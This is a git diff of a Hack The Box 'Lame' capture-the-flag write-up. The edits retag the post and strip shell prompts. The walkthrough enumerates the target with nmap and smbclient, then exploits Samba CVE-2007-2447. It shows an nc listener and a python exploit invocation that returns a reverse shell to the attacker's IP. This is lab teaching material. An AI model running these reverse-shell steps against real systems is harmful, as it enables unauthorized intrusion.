@@ -2,7 +2,7 @@
 title: Hack The Box - Lame
 date: 2022-11-11
 categories: [hackthebox]
-tags: [hackthebox]
+tags: [windows,cve,metasploit,easy]
 comments: true
 toc: true
 ---
@@ -12,8 +12,7 @@ toc: true
 Starting with `nmap` scan.
 
 ```bash
-┌─[root@linux]─[/home/htb] 
-└──╼# nmap --min-rate 10000 -oN lame.nmap 10.10.10.3 
+# nmap --min-rate 10000 -oN lame.nmap 10.10.10.3 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:14 +0545 
 Nmap scan report for 10.10.10.3 
 Host is up (0.63s latency). 
@@ -25,8 +24,7 @@ PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 
 # Full TCP port scan
-┌─[root@linux]─[/home/htb] 
-└──╼# nmap -p- --min-rate 10000 -oN lame.nmap 10.10.10.3 
+# nmap -p- --min-rate 10000 -oN lame.nmap 10.10.10.3 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:14 +0545 
 Nmap scan report for 10.10.10.3 
 Host is up (0.59s latency). 
@@ -40,8 +38,8 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 133.07 seconds
 
 # Full UDP port scan
-┌─[root@linux]─[/home/htb] 
-└──╼ #nmap -sU -p- --min-rate 10000 -oN lame.nmap 10.10.10.3 
+
+#nmap -sU -p- --min-rate 10000 -oN lame.nmap 10.10.10.3 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:17 +0545 
 Nmap scan report for 10.10.10.3 
 Host is up (0.48s latency). 
@@ -53,8 +51,8 @@ PORT     STATE  SERVICE
 3632/udp closed distcc 
 Nmap done: 1 IP address (1 host up) scanned in 50.50 seconds
 
-┌─[root@linux]─[/home/htb] 
-└──╼ #nmap -sC -sV -p 22,139,445,3632 10.10.10.3 
+
+#nmap -sC -sV -p 22,139,445,3632 10.10.10.3 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:19 +0545 
 Nmap scan report for 10.10.10.3 
 Host is up (0.51s latency). 
@@ -116,8 +114,7 @@ A quick google search shows us that this version is famously vulnerable to a `ba
 Found a nmap script to check this vulnerability.Scanning with `nmap script` shows that this machine is `not vulnerable`.
 
 ```bash
-┌─[root@linux]─[/usr/share/nmap/scripts] 
-└──╼ #nmap --script ftp-vsftpd-backdoor.nse 10.10.10.3 -p 21 
+#nmap --script ftp-vsftpd-backdoor.nse 10.10.10.3 -p 21 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:33 +0545 
 Nmap scan report for 10.10.10.3 
 Host is up (0.27s latency). 
@@ -132,8 +129,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.98 seconds
 ### Anonymous Login
 `smbmap` shows only `/tmp` directory is accessible without credentials.
 ```bash
-┌─[root@linux]─[/usr/share/nmap/scripts] 
-└──╼ #smbmap -H 10.10.10.3 
+#smbmap -H 10.10.10.3 
 [+] IP: 10.10.10.3:445	Name: 10.10.10.3                                         
         Disk                                                  	Permissions	Comment 
 	----                                                  	-----------	------- 
@@ -145,8 +141,8 @@ Nmap done: 1 IP address (1 host up) scanned in 27.98 seconds
 ```
 After checking the `/tmp` directory with `smbclient`, it seems there's nothing interesting.
 ```bash
-┌─[root@linux]─[/usr/share/nmap/scripts] 
-└──╼ #smbclient -N //10.10.10.3/tmp 
+
+#smbclient -N //10.10.10.3/tmp 
 Anonymous login successful 
 Try "help" to get a list of possible commands. 
 smb: \> dir 
@@ -179,8 +175,8 @@ Going through the code tells us that the script is running the following command
 ### Port 3632 distcc v1
 Googling `“distcc v1”` reveals that this service is vulnerable to a `remote code execution` and there’s an `nmap script` that can verify that. On executing nmap script, it states that this machine is `vulnerable`.
 ```bash
-┌─[root@linux]─[/usr/share/nmap/scripts] 
-└──╼ #nmap --script distcc-cve2004-2687.nse -p 3632 10.10.10.3 
+
+#nmap --script distcc-cve2004-2687.nse -p 3632 10.10.10.3 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 20:11 +0545 
 Nmap scan report for 10.10.10.3 
 Host is up (0.31s latency). 
@@ -213,8 +209,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
 ### 1. Samba Exploit
 Exploing using smbclient.
 ```bash
-┌─[root@linux]─[/home/htb/lame] 
-└──╼ #smbclient //10.10.10.3/tmp 
+#smbclient //10.10.10.3/tmp 
 Enter WORKGROUP\niraz's password:  
 Anonymous login successful 
 Try "help" to get a list of possible commands. 
@@ -223,8 +218,7 @@ Password:
 ```
 and we get connection back to our machine.
 ```bash 
-┌─[root@linux]─[/opt] 
-└──╼ #nc -lvnp 4444 
+#nc -lvnp 4444 
 listening on [any] 4444 ... 
 connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 53095
 whoami 
@@ -265,15 +259,13 @@ if __name__ == '__main__':
 ```
 running the above `python script` we get the root shell
 ```bash
-┌─[root@linux]─[/home/htb/lame] 
-└──╼ #python3 lame-smb-exploit.py 10.10.10.3 139 10.10.14.2 4444 
+#python3 lame-smb-exploit.py 10.10.10.3 139 10.10.14.2 4444 
 [*] CVE-2007-2447 - Samba usermap script 
 [+] Connecting !
 ```
 
 ```bash
-┌─[root@linux]─[/opt] 
-└──╼ #nc -lvnp 4444 
+#nc -lvnp 4444 
 listening on [any] 4444 ... 
 connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 39930
 whoami
